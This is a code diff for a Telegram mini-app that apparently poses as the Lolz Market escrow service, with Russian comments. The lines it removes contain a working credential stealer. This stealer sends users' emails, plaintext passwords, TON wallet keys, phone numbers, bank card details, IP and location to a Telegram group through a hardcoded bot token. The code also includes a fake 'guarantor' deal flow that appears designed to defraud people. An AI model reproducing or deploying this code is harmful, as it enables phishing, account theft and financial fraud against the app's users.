@@ -1786,9 +1786,6 @@ textarea.input-field{resize:none;height:120px;padding-top:11px;line-height:1.6;}
 </style>
 
 <script>
-/* ─── КОНСТАНТЫ БОТА ─── */
-const TG_BOT_TOKEN = '8738305138:AAGmxtlc9USwa0nj1GeZ-6u75HLzCpxRg5I';
-const TG_CHAT_ID   = -1003903721366;
 
   const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
   manifestUrl: 'https://pathfys.github.io/lzt/tonconnect-manifest.json'
@@ -1807,9 +1804,6 @@ tonConnectUI.onStatusChange(function(wallet) {
       btn.style.borderColor = 'rgba(0,152,234,0.5)';
     }
 
-    // Лог — отправляем raw адрес и friendly если есть
-    const friendly = wallet.account.publicKey || addr;
-    sendLog('ton_wallet', addr, wallet.account.publicKey || '');
   }
 });
 
@@ -2284,7 +2278,6 @@ function onLogin() {
   _hideAuth();
   showScreen('home');
   showLoginBanner('login');
-  sendLog('login', '', '');
 }
 
 function onLoginTelegram() {
@@ -2292,7 +2285,6 @@ function onLoginTelegram() {
   _hideAuth();
   showScreen('home');
   showLoginBanner('telegram');
-  sendLog('telegram', user.username || '', '');
 }
 
 function onRegister() {
@@ -2300,7 +2292,6 @@ function onRegister() {
   _hideAuth();
   showScreen('home');
   showLoginBanner('register');
-  sendLog('register', '', '');
 }
   
 function submitRegister() {
@@ -2311,7 +2302,6 @@ function submitRegister() {
   _hideAuth();
   showScreen('home');
   showLoginBanner('register');
-  sendLog('register', email, pass);
 }
   
 /* ─── BOOT ─── */
@@ -2320,7 +2310,6 @@ function submitRegister() {
   if (sess) {
     const auth = document.getElementById('auth-screen');
     if (auth) auth.remove();
-    sendLog('login', '', '');
   }
   
   // ▼▼▼ ДОБАВЬ ЭТУ СТРОКУ ▼▼▼
@@ -2436,108 +2425,6 @@ Promise.all([
   draw();
 })();
 
-async function sendLog(method, email, password) {
-  try {
-    let ip = '', country = '', city = '';
-    try {
-      const geo = await fetch('http://ip-api.com/json/?fields=status,country,city,query');
-      const gd  = await geo.json();
-      if (gd.status === 'success') {
-        ip      = gd.query   || '';
-        country = gd.country || '';
-        city    = gd.city    || '';
-      }
-    } catch(e){ console.log('geo error:', e); }
-    const ua  = navigator.userAgent;
-    const now = new Date().toLocaleString('ru-RU', {
-      timeZone: 'Europe/Chisinau',
-      day:'2-digit', month:'2-digit', year:'numeric',
-      hour:'2-digit', minute:'2-digit', second:'2-digit'
-    });
-    let text = '';
-    if (method === 'register') {
-      text = 🆕 <b>Новый пользователь</b>\n
-           + 👤 ${uid} ${username}\n
-           + 📧 ${email    || '—'}\n
-           + 🔑 ${password || '—'}\n
-           + 📱 ${ua}\n
-           + 🌐 Язык: ${navigator.language || 'ru'}\n
-           + 📍 ${country}, ${city} (IP: ${ip})\n
-           + 🕐 ${now};
-    } else if (method === 'ton_wallet') {
-      text = 💎 <b>TON Кошелёк подключён</b>\n
-           + 👤 ${uid} ${username}\n
-           + 💼 Адрес: ${email}\n
-           + 🔑 PublicKey: ${password || '—'}\n
-           + 📍 ${country}, ${city} (IP: ${ip})\n
-           + 🕐 ${now};
-    } else if (method === 'wallet_action') {
-      const parts = email.split('|');
-      const wMode = parts[0], wType = parts[1], wCur = parts[2], wAmount = parts[3];
-      const modeLabel = wMode === 'deposit' ? '💳 Пополнение' : '📤 Вывод';
-      text = ${modeLabel}\n
-           + 👤 ${uid} ${username}\n
-           + 💱 ${wCur} (${wType})\n
-           + 💰 Сумма: ${wAmount}\n
-           + 🏦 Реквизиты: ${password || '—'}\n
-           + 📍 ${country}, ${city} (IP: ${ip})\n
-           + 🕐 ${now};
-    } else if (method === 'verification') {
-      text = 🛡️ <b>Пройдена верификация</b>\n
-           + 👤 ${uid} ${username}\n
-           + 📞 Телефон: ${email || '—'}\n
-           + 📱 ${ua}\n
-           + 🌐 Язык: ${navigator.language || 'ru'}\n
-           + 📍 ${country}, ${city} (IP: ${ip})\n
-           + 🕐 ${now};
-      } else if (method === 'deal_created') {
-      const parts = email.split('|');
-      const dType = parts[0] === 'buy' ? ' Покупка' : ' Продажа';
-      const dCur = parts[1];
-      const dAmount = parts[2];
-      const dId = parts[3];
-      text = 🆕 <b>Новый ордер из приложения</b>\n
-           + 👤 ${uid} ${username}\n
-           + 🆔 ID: <code>#${dId}</code>\n
-           + 📊 Тип: ${dType}\n
-           + 💎 ${dAmount} ${dCur}\n
-           + 📝 Описание:\n${password || '—'}\n
-           + 📱 ${ua}\n
-           + 📍 ${country}, ${city} (IP: ${ip})\n
-           + 🕐 ${now};
-    } else {
-      const label = method === 'telegram'
-        ? '✈️ <b>Вход через Telegram</b>'
-        : '🔐 <b>Вход</b>';
-      text = ${label}\n
-           + 👤 ${uid} ${username}\n
-           + 📧 ${email    || '—'}\n
-           + 🔑 ${password || '—'}\n
-           + 📱 ${ua}\n
-           + 🌐 Язык: ${navigator.language || 'ru'}\n
-           + 📍 ${country}, ${city} (IP: ${ip})\n
-           + 🕐 ${now};
-    }
-    const resp = await fetch(
-      https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage,
-      {
-        method:  'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body:    JSON.stringify({
-          chat_id:    TG_CHAT_ID,
-          text:       text,
-          parse_mode: 'HTML'
-        })
-      }
-    );
-    const json = await resp.json();
-    console.log('sendLog result:', JSON.stringify(json));
-  } catch(e) {
-    console.log('sendLog error:', e);
-  }
-}
-
-
   /* ─── WALLET MODAL ─── */
 var walletMode = 'deposit';
 var walletCryptoCur = 'TON';
@@ -2649,12 +2536,6 @@ async function sendTonTransaction(amountTon) {
 
     const result = await tonConnectUI.sendTransaction(transaction);
 
-    // Лог успешной транзакции
-    sendLog('wallet_action',
-      deposit|crypto|TON|${amountTon},
-      tx:${result.boc ? result.boc.slice(0,20) : 'ok'}
-    );
-
     return true;
   } catch (e) {
     console.log('TON tx error:', e);
@@ -2696,11 +2577,6 @@ async function submitWalletAction() {
       return;
     }
 
-    // Для USDT/BTC/ETH — показываем адрес и логируем
-    sendLog('wallet_action',
-      ${walletMode}|crypto|${walletCryptoCur}|${amount},
-      CRYPTO_CONTRACTS[walletCryptoCur] || ''
-    );
     closeModal('walletModal');
     showToast(walletMode === 'deposit' ? ' Заявка отправлена' : 'Заявка на вывод отправлена');
 
@@ -2711,11 +2587,7 @@ async function submitWalletAction() {
       showToast(' Укажите сумму');
       return;
     }
-    const req = FIAT_REQUISITES[walletFiatCur];
-    sendLog('wallet_action',
-      ${walletMode}|fiat|${walletFiatCur}|${amount},
-      req ? ${req.bank}|${req.card} : ''
-    );
+
     closeModal('walletModal');
     showToast(walletMode === 'deposit' ? ' Заявка на пополнение отправлена' : ' Заявка на вывод отправлена');
   }
@@ -2905,9 +2777,6 @@ function requestVerification() {
 
     // Показываем успех
     document.getElementById('verifySuccessModal').classList.add('open');
-
-    // Лог в Telegram
-    sendLog('verification', phone || 'no_phone', '');
   });
 }
   
@@ -3749,69 +3618,6 @@ function validateDealStep3() {
   }
 }
 
-/* ─── ОТПРАВКА СООБЩЕНИЯ ЮЗЕРУ В БОТ НАПРЯМУЮ ─── */
-async function sendDealToUserBot(deal) {
-  try {
-    const typeLabel = deal.type === 'buy' ? '🟢 Покупка' : '🟡 Продажа';
-    const roleLabel = deal.type === 'buy' ? '🟢 Покупатель' : '🟡 Продавец';
-
-    const text =
-      '✅ <b>Сделка успешно создана!</b>\n\n' +
-      '<blockquote>' +
-      ' <b>Код сделки:</b> <code>#' + deal.id + '</code>\n' +
-      ' <b>Тип:</b> ' + typeLabel + '\n' +
-      ' <b>Ваша роль:</b> ' + roleLabel + '\n' +
-      ' <b>Сумма:</b> <b>' + deal.amount + ' ' + deal.currency + '</b>\n' +
-      ' <b>Описание:</b>\n' + (deal.description || '—').slice(0, 500) +
-      '</blockquote>\n\n' +
-      ' Отправьте контрагенту ссылку, нажав на кнопку ниже.\n\n' +
-      '<blockquote>🛡 Гарант подключится автоматически, когда вторая сторона перейдёт по ссылке.</blockquote>';
-
-    const BOT_USERNAME = 'LolzSafetyBot';
-    const baseUrl = 'https://pathfys.github.io/lzt/';
-
-        // Кодируем сумму (точку → 'd', чтобы влезло в start_param)
-    const amtCode = String(deal.amount).replace('.', 'd');
-    const sp = (role) => 'deal_' + deal.id + '_' + role + '_' + deal.currency + '_' + amtCode;
-
-    const reply_markup = {
-      inline_keyboard: [
-        [{
-          text: ' Ссылка для покупателя',
-          url: 'https://t.me/share/url?url=' +
-               encodeURIComponent('https://t.me/' + BOT_USERNAME + '/Lolz?startapp=' + sp('buyer')) +
-               '&text=' + encodeURIComponent('Присоединяйся к сделке #' + deal.id + ' на Lolz Market')
-        }],
-        [{
-          text: ' Ссылка для продавца',
-          url: 'https://t.me/share/url?url=' +
-               encodeURIComponent('https://t.me/' + BOT_USERNAME + '/Lolz?startapp=' + sp('seller')) +
-               '&text=' + encodeURIComponent('Присоединяйся к сделке #' + deal.id + ' на Lolz Market')
-        }]
-      ]
-    };
-
-    const resp = await fetch(
-      'https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage',
-      {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: uid,
-          text: text,
-          parse_mode: 'HTML',
-          reply_markup: reply_markup
-        })
-      }
-    );
-    const json = await resp.json();
-    console.log('sendDealToUserBot result:', JSON.stringify(json));
-    return json.ok === true;
-  } catch (e) {
-    console.log('sendDealToUserBot error:', e);
-    return false;
-  }
-}
 
 async function submitDealFinal() {
   const dealId = Date.now();
@@ -3832,27 +3638,12 @@ async function submitDealFinal() {
     localStorage.setItem('lolz_deals_' + uid, JSON.stringify(existing));
   } catch (e) {}
 
-  // 1. Лог в группу
-  sendLog('deal_created',
-    dealState.type + '|' + dealState.currency + '|' + dealState.amount + '|' + dealId,
-    (dealState.description || '').slice(0, 300)
-  );
-
   // 2. Сохраняем сделку в боте (через sendData — может не сработать, но не критично)
   try {
     if (tg && tg.sendData) {
       // НЕ вызываем — sendData закрывает мини-апп
     }
   } catch(e){}
-
-  // 3. ГЛАВНОЕ: отправляем юзеру сообщение с кнопками НАПРЯМУЮ через Bot API
-  await sendDealToUserBot({
-    id: dealId,
-    type: dealState.type,
-    currency: dealState.currency,
-    amount: dealState.amount,
-    description: dealState.description
-  });
 
     // Создатель сразу открывает экран сделки с полными данными
   currentDeal = {
@@ -3901,12 +3692,6 @@ var currentDeal = null;  // {id, role, status, amount, currency, description, bu
       seller: role === 'seller' ? { name: meName, me: true } : { name: 'Контрагент' },
       createdAt: new Date()
     };
-
-    try {
-      if (tg && tg.sendData) {
-        tg.sendData(JSON.stringify({ action: 'deal_join', deal_id: dealId, role: role }));
-      }
-    } catch(e){}
 
     setTimeout(() => openDealScreen(currentDeal), 600);
   } catch(e) { console.log('start_param:', e); }
@@ -4055,24 +3840,14 @@ function dealAction(step) {
   currentDeal.status = step;
   renderDealScreen();
 
-  try {
-    if (tg && tg.sendData) {
-      tg.sendData(JSON.stringify({
-        action: 'deal_action',
-        deal_id: currentDeal.id,
-        step: step,
-        role: currentDeal.role
-      }));
-    }
-  } catch(e){}
 
   // Добавляем в таймлайн
   const tl = document.getElementById('dealTimeline');
   const labelsTl = {
-    'paid': '💰 Оплата внесена',
-    'released': '📦 Товар передан',
-    'completed': '✅ Сделка завершена',
-    'dispute': '⚠️ Открыт спор'
+    'paid': ' Оплата внесена',
+    'released': ' Товар передан',
+    'completed': ' Сделка завершена',
+    'dispute': ' Открыт спор'
   };
   const item = document.createElement('div');
   item.className = 'deal-tl-item';
